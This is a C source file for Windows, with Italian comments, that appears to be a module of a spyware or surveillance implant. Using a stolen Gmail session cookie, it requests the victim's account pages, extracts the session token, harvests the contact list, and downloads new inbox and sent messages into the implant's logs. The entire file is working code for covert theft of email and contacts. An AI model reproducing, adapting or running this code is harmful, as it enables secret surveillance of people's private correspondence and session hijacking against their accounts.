#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

#define GM_GLOBAL_IDENTIFIER "var GLOBALS=["
#define GM_MAIL_IDENTIFIER ",[\"^all\",\""
#define GM_INBOX_IDENTIFIER "inbox"
#define GM_OUTBOX_IDENTIFIER "sent"
#define GM_CONTACT_IDENTIFIER "[\"ct\",\""

#define FREE_INNER_PARSING(x) if (!x) { SAFE_FREE(r_buffer_inner); break; }
#define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }

extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);

extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 
extern DWORD max_social_mail_len;

DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
{
	HANDLE hfile;
	WCHAR mail_request[256];
	BYTE *r_buffer = NULL;
	DWORD ret_val;
	DWORD response_len = 0;
	char *parser1, *parser2;
	WCHAR screen_name[256];
	WCHAR mail_account[256];
	DWORD flags;

	CheckProcessStatus();
	// Prende la lista dei messaggi per la mail box selezionata
	_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), L"/mail/?ui=2&ik=%S&view=au&rt=j", ik_val);
	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = (char *)r_buffer;

	CheckProcessStatus();
	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
	LOOP {
		flags = 0;
		parser1 = strstr(parser1, GM_CONTACT_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(GM_CONTACT_IDENTIFIER);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snwprintf_s(screen_name, sizeof(screen_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, ",\"");
		if (!parser1)
			break;
		parser1 += strlen(",\"");
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snwprintf_s(mail_account, sizeof(mail_account)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);
		parser1 = parser2 + 1;

		if (!wcscmp(mail_account, user_name))
			flags |= CONTACTS_MYACCOUNT;

		DumpContact(hfile, CONTACT_SRC_GMAIL, screen_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, mail_account, NULL, flags);
	}
	Log_CloseFile(hfile);

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	BYTE *r_buffer_inner = NULL;
	DWORD response_len = 0;
	char *ptr, *ptr_inner, *ptr_inner2;
	WCHAR mail_request[256];
	char mail_id[17];
	char src_add[1024], dest_add[1024], cc_add[1024], subject[1024];
	char tmp_buff[256];
	DWORD act_tstamp_hi=0, act_tstamp_lo=0;

	CheckProcessStatus();
	// Prende la lista dei messaggi per la mail box selezionata
	_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), L"/mail/?ui=2&ik=%S&view=tl&start=0&num=70&rt=c&search=%S",ik_val, mbox);
	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	ptr = (char *)r_buffer;

	// Parsa la lista dei messaggi
	for(;;) {
		CheckProcessStatus();
		ptr = strstr(ptr, GM_MAIL_IDENTIFIER); 
		if (!ptr) 
			break;
		memset(mail_id, 0, sizeof(mail_id));
		memcpy(mail_id, ptr-21, 16);
		ptr+=strlen(GM_MAIL_IDENTIFIER);
		if (!atoi(mail_id))
			continue;

		// Verifica se e' gia' stato preso
		sscanf(mail_id, "%8x%8X", &act_tstamp_hi, &act_tstamp_lo);
		if (act_tstamp_hi>2000000000)
			continue;
		if (act_tstamp_hi < last_tstamp_hi)
			continue;
		if (act_tstamp_hi==last_tstamp_hi && act_tstamp_lo<=last_tstamp_lo)
			continue;
		SetLastFBTstamp(ik_val, act_tstamp_lo, act_tstamp_hi);

		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"/mail/?ui=2&ik=%S&view=om&th=%S", ik_val, mail_id);
		
		ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer_inner, &response_len, cookie);
		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
			SAFE_FREE(r_buffer);
			return ret_val;
		}

		CheckProcessStatus();
		// Check sulla dimensione stabilita' nell'agente
		if (response_len > max_social_mail_len)
			response_len = max_social_mail_len;
		// Verifica che non mi abbia risposto con la pagina di login
		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received: "))
			LogSocialMailMessageFull(MAIL_GMAIL, r_buffer_inner, response_len, is_incoming);
		else {
			SAFE_FREE(r_buffer_inner);
			break;
		}

		/*
		// Parsa il contenuto della mail
		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, "[\"ms\",\"%s\",", mail_id);
		ptr_inner = (char *)r_buffer_inner;
		ptr_inner = strstr(ptr_inner, tmp_buff); 
		FREE_INNER_PARSING(ptr_inner);
		ptr_inner += strlen(tmp_buff);

		// Cerca il quarto parametro da qui
		for (int i=0; i<4; i++) {
			ptr_inner = strchr(ptr_inner, ',');
			FREE_INNER_PARSING(ptr_inner);
			ptr_inner++;
		}
		FREE_INNER_PARSING(ptr_inner);
		ptr_inner2 = strchr(ptr_inner, ',');
		FREE_INNER_PARSING(ptr_inner2);
		*ptr_inner2 = 0;
		// Legge il mittente
		_snprintf_s(src_add, sizeof(src_add), _TRUNCATE, "%s", ptr_inner);
		ptr_inner = ptr_inner2 + 1;

		// Legge il subject
		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, "\",[\"%s\",[", mail_id);
		ptr_inner = strstr(ptr_inner, tmp_buff); 
		FREE_INNER_PARSING(ptr_inner);
		*ptr_inner = 0;
		for(ptr_inner2 = ptr_inner-1; *ptr_inner2!=0; ptr_inner2--) {
			char *prv_ch = ptr_inner2-1;
			if (*ptr_inner2=='\"' && *prv_ch!='\\')
				break;
		}
		if (*ptr_inner2 == '\"')
			ptr_inner2++;
		_snprintf_s(subject, sizeof(subject), _TRUNCATE, "%s", ptr_inner2);
		ptr_inner += strlen(tmp_buff);
		ptr_inner2 = strchr(ptr_inner, ']');
		FREE_INNER_PARSING(ptr_inner2);
		*ptr_inner2 = 0;
		// Legge i destinatari
		_snprintf_s(dest_add, sizeof(dest_add), _TRUNCATE, "%s", ptr_inner);
		ptr_inner = ptr_inner2 + 1; 
		ptr_inner = strstr(ptr_inner, ",[");
		FREE_INNER_PARSING(ptr_inner);
		ptr_inner += strlen(",[");
		ptr_inner2 = strchr(ptr_inner, ']');
		FREE_INNER_PARSING(ptr_inner2);
		*ptr_inner2 = 0;
		// Legge i cc
		_snprintf_s(cc_add, sizeof(cc_add), _TRUNCATE, "%s", ptr_inner);
		ptr_inner = ptr_inner2 + 1; 

		// Recupera il body
		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, ",\"%s\",\"", subject);
		ptr_inner = strstr(ptr_inner, tmp_buff); 
		FREE_INNER_PARSING(ptr_inner);
		ptr_inner += strlen(tmp_buff);
		for(ptr_inner2 = ptr_inner; *ptr_inner2!=0; ptr_inner2++) {
			char *prv_ch = ptr_inner2-1;
			if (*ptr_inner2=='\"' && *prv_ch!='\\')
				break;
		}
		*ptr_inner2 = 0;

		CheckProcessStatus();
		
		urldecode(src_add);
		urldecode(dest_add);
		urldecode(cc_add);
		JsonDecode(subject);
		JsonDecode(ptr_inner);
		LogSocialMailMessage(MAIL_GMAIL, src_add, dest_add, cc_add, subject, ptr_inner, is_incoming);*/
	
		SAFE_FREE(r_buffer_inner);
	}
		
	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD HandleGMail(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	WCHAR mail_request[256];
	static WCHAR last_user_name[256];
	char ik_val[32];
	char *ptr, *ptr2;
	DWORD last_tstamp_hi, last_tstamp_lo;

	CheckProcessStatus();

	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	// Verifica il cookie 
	swprintf_s(mail_request, L"/mail/?shva=1#%S", GM_INBOX_IDENTIFIER);
	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	ptr = strstr((char *)r_buffer, GM_GLOBAL_IDENTIFIER);
	FREE_PARSING(ptr);

	// Cerca il parametro ik (e' il nono)
	for (int i=0; i<9; i++) {
		ptr = strchr(ptr, ',');
		FREE_PARSING(ptr);
		ptr++;
	}
	ptr = strchr(ptr, '\"');
	FREE_PARSING(ptr);
	ptr++;
	ptr2 = strchr(ptr, '\"');
	FREE_PARSING(ptr2);
	*ptr2 = 0;
	_snprintf_s(ik_val, sizeof(ik_val), _TRUNCATE, "%s", ptr);	

	// Cattura i contatti
	ret_val = SOCIAL_REQUEST_SUCCESS;
	if (bPM_ContactsStarted) {
		ptr = ptr2 + 1;
		ptr = strchr(ptr, '\"');
		FREE_PARSING(ptr);
		ptr++;
		ptr2 = strchr(ptr, '\"');
		FREE_PARSING(ptr2);
		*ptr2 = 0;
	
		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
		// Se e' diverso dall'ultimo username allora lo logga...
		if (wcscmp(mail_request, last_user_name)) {
			_snwprintf_s(last_user_name, sizeof(last_user_name)/sizeof(WCHAR), _TRUNCATE, L"%s", mail_request);		
			ret_val = ParseContacts(cookie, ik_val, last_user_name);
		}
	}

	SAFE_FREE(r_buffer);
	if (!bPM_MailCapStarted)
		return ret_val;

	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE);
}
